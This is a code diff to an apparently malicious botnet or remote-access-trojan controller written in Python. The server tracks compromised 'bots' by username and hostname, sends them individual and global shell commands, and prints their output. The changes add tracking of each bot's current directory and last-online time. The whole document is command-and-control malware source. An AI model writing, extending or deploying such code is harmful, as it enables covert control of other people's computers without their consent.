@@ -83,7 +83,8 @@ class Controller:
 
                     for i, bot in enumerate(self._model.get_bots(limit=10)):
                         self._view.output("{} = \"{}@{}\" (last seen: {})".format(
-                            str(i), bot.username, bot.hostname, strftime("%a, %b %d @ %H:%M", localtime(bot.last_seen))
+                            str(i), bot.username, bot.hostname,
+                            strftime("%a, %b %d @ %H:%M:%S", localtime(bot.last_online))
                         ))
             else:
                 try:
@@ -115,8 +116,8 @@ class Controller:
                 self._view.output("Connected to \"%s@%s\", ready to send commands." % (
                     self._connected_bot.username, self._connected_bot.hostname
                 ), "info")
-                self._view.set_footer_text("Command ({}@{}): ".format(
-                    self._connected_bot.username, self._connected_bot.hostname
+                self._view.set_footer_text("Command ({}@{}, {}): ".format(
+                    self._connected_bot.username, self._connected_bot.hostname, self._connected_bot.local_path
                 ))
             except (IndexError, ValueError):
                 self._view.output("Invalid bot ID (see \"bots\").", "attention")
@@ -264,6 +265,12 @@ class BotController(BaseHTTPRequestHandler):
             VERSION, self._server_port, self._model.get_bot_amount()
         ))
 
+    def _update_bot_path(self, bot: Bot):
+        """Updates the path of the bot."""
+        self._view.set_footer_text("Command ({}@{}, {}): ".format(
+            bot.username, bot.hostname, bot.local_path
+        ))
+
     def do_GET(self):
         cookie = self.headers.get("Cookie")
 
@@ -293,14 +300,18 @@ class BotController(BaseHTTPRequestHandler):
             elif request_type == RequestType.GET_COMMAND:
                 username = data["username"]
                 hostname = data["hostname"]
+                local_path = data["path"]
 
                 if not self._model.is_known_bot(bot_uid):
                     # This is the first time this bot connected.
-                    self._model.add_bot(Bot(bot_uid, username, hostname, time()))
+                    self._model.add_bot(Bot(bot_uid, username, hostname, time(), local_path))
                     self._update_bot_amount()
 
                     self._send_command()
                 else:
+                    # Update the bot's session (last online and local path).
+                    self._model.update_bot(bot_uid, time(), local_path)
+
                     has_executed_global, global_command = self._model.has_executed_global(bot_uid)
 
                     if not has_executed_global:
@@ -332,6 +343,14 @@ class BotController(BaseHTTPRequestHandler):
                     self._view.output(line)
         else:
             # Command response.
+            if response.decode().startswith("Directory changed to"):
+                # Update the view's footer to show the updated path.
+                new_path = response.decode().replace("Directory changed to: ", "", 1)
+                bot_uid = data["bot_uid"]
+
+                self._model.update_bot(bot_uid, time(), new_path)
+                self._update_bot_path(self._model.get_bot(bot_uid))
+
             self._view.output_separator()
 
             for line in response.splitlines():
